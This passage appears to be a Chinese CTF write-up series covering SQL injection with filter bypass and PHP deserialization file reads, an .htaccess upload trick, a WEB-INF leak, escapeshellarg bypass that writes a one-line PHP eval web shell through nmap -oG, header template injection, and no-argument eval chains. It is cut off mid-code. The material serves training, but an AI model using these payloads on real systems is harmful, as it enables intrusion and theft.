+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=1#	正常</span><br><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=2#	错误</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有注入点,这里发现字段数为4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view.php?no=1 order by 3#	错误</span><br><span class="line">view.php?no=1 order by 4#	正常</span><br><span class="line">view.php?no=1 order by 5#	错误</span><br></pre></td></tr></table></figure>
+
+<p>在这里发现网页有对sql注入语句的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
+
+<p>这里经过fuzz发现单个的字符并未进行过滤而是过滤的union select整个语句所以这里使用注释符&#x2F;**&#x2F;进行绕过,或者++进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union++select 1,2,3,4</span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101043115.png" alt="image-20220310104318999"></p>
+<p>这里发现2字段可以使用这里直接使用load_file()函数获取系统文件要求,权限较高,且要求文件的绝对路径,这里并没有</p>
+<p>这里继续注入一下其他内容看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">//获得用户名</span><br><span class="line">root@localhost </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">//获得数据库名</span><br><span class="line">fakebook </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#</span><br><span class="line">//获取fakebook中的表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,group_concat(data,username,passwd),3,4 from users where no=1#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名为data,username,passwd的值</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;a1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 </span><br></pre></td></tr></table></figure>
+
+<p>这里的序列化对象便与之前的获得到的user.php.bak 进行了对应 这里便是进行反序列化了class UserInfo{}类</p>
+<p>最开始时的用户页面no&#x3D;1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no&#x3D;1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101045078.png" alt="image-20220310104526968"></p>
+<p>注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的）</p>
+<p>因此这里需要构造blog参数的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>原因是在源码中有blog的base64编码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;10em&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,&#x27;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>这里利用了File协议读取本地文件,使用PHP构造出payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着进行访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到base64加密文件</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101047862.png" alt="image-20220310104731820"></p>
+<p>这里进行base64解密得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也可以直接点击链接</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101047366.png" alt="image-20220310104743329"></p>
+<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153350396.png" alt="image-20220427153350396"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153433425.png" alt="image-20220427153433425"></p>
+<p>不可php</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153453397.png" alt="image-20220427153453397"></p>
+<p>类型也不对</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153515177.png" alt="image-20220427153515177"></p>
+<p>内容也有检查来个短标签,这里的php版本是5.x</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153637801.png" alt="image-20220427153637801"></p>
+<p>传个.htaccess去解析一下png文件</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153902672.png" alt="image-20220427153902672"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427153951099.png" alt="image-20220427153951099"></p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427154052505.png" alt="image-20220427154052505"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427154108437.png" alt="image-20220427154108437"></p>
+<p>java题目一般都要先获取源码,但是这里的get方法却获取不了,改了一下请求方式就好了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427154541412.png" alt="image-20220427154541412"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427154850175.png" alt="image-20220427154850175"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427154856150.png" alt="image-20220427154856150"></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;IndexController.class</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427155152068.png" alt="image-20220427155152068"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427155344734.png" alt="image-20220427155344734"></p>
+<p>????</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427155407450.png" alt="image-20220427155407450"></p>
+<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">escapeshellarg()</span><br><span class="line">把字符串转码为可以在shell命令里面使用的参数,给字符串增加一个单引号,并且能引用或者转码任何已经存在的单引号,以确保能够直接将一个字符串传入shell函数,并且还是安全的.就是如果输入的内容不包含单引号,则直接对输入的字符串添加一堆单引号括起来;如果输入内容包含单引号,则先对该单引号进行转义,在对剩余部分字符串添加响应对数的单引号括起来</span><br><span class="line">场景</span><br><span class="line">确保用户只传递一个参数给命令</span><br><span class="line">用户不能指定更多的参数</span><br><span class="line">用户不能执行不同的命令</span><br><span class="line"></span><br><span class="line">escapeshellcmd()</span><br><span class="line">shell元字符转义,对字符串中可能会欺骗shell命令执行任意命令的字符串进行转义.此函数确保用户输入的数据在传送到exec()或者system()函数,或者执行操作符之前进行转义.就是如果输入内容中出现上述的字符就会使用反斜杠转义掉,如果单引号和双引号不是成对出现,会被转义掉</span><br><span class="line">场景</span><br><span class="line">确保用户只执行一个命令</span><br><span class="line">用户可以指定不限数量的参数</span><br><span class="line">用户不能执行不同的命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="谈谈escapeshellarg参数绕过和注入的问题"><a href="#谈谈escapeshellarg参数绕过和注入的问题" class="headerlink" title="谈谈escapeshellarg参数绕过和注入的问题"></a><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题</a></h2><p>接着这个题用到了Nmap的命令，我们可以找一下nmap有哪些可以存在注入的参数。通过查找nmap的参数发现，有一个-oG的参数可以将执行的结果放到指定文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427161504305.png" alt="image-20220427161504305"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427161606000.png" alt="image-20220427161606000"></p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427162324847.png" alt="image-20220427162323313"></p>
+<p>给了个ip,改下X-Forwarded-For试试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427162510977.png" alt="image-20220427162510977"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427162556833.png" alt="image-20220427162556833"></p>
+<p>试了下模板可以执行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427162623136.png" alt="image-20220427162623136"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427162640859.png" alt="image-20220427162640859"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427165130819.png" alt="image-20220427165130819"></p>
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427165148736.png" alt="image-20220427165148736"></p>
+<p>git源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://d4a3c021-1245-4189-a0f7-305032560dee.node4.buuoj.cn/.git/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427165424987.png" alt="image-20220427165424987"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>正则表达式这里(?R)是引用当前表达式,(?R)?这里有一个?表示匹配0到多个前面的.引用异常正则表达式则变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\([a-z,_]+\((?R)?\)\)</span><br></pre></td></tr></table></figure>
+
+<p>那么他匹配的就是print(echo(1))这种</p>
+<p>localeconv()函数返回一包含本地数字及货币格式信息的数组.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line"><span class="comment">//array(18) &#123;</span></span><br><span class="line"><span class="comment">//&#x27;decimal_point&#x27; =&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;.&quot;</span></span><br><span class="line"><span class="comment">//  &#x27;thousands_sep&#x27; =&gt;</span></span><br><span class="line"><span class="comment">//  string(0) &quot;&quot; .....</span></span><br></pre></td></tr></table></figure>
+
+<p>可见第一个就是.点</p>
+<p>current()函数返回数组中的当前元素的值.每一个数组都有一个内部的指针指向它的当前元素,初始指向插入到数组中的第一个元素</p>
+<p>scandir()列出指定目录中的文件和目录,当参数为点时,即列出当前目录的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427174114680.png" alt="image-20220427174114680"></p>
+<p>next()函数将内部的指针指向数组的下一个元素并输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427174241381.png" alt="image-20220427174241381"></p>
+<p>利用session_id()实现任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_id可以获取PHPSESSID的值,而我们知道PHPSESSID允许出现字母和数字,而flag.php符合条件,因此我们在请求包中cookie: PHPSESSID=flag.php,使用session之前需要通过session_start()告诉PHP使用session,php默认是不主动使用session的,seddion_id()可以获取得到当前的session id </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427174752066.png" alt="image-20220427174752066"></p>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427175552170.png" alt="image-20220427175552170"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span 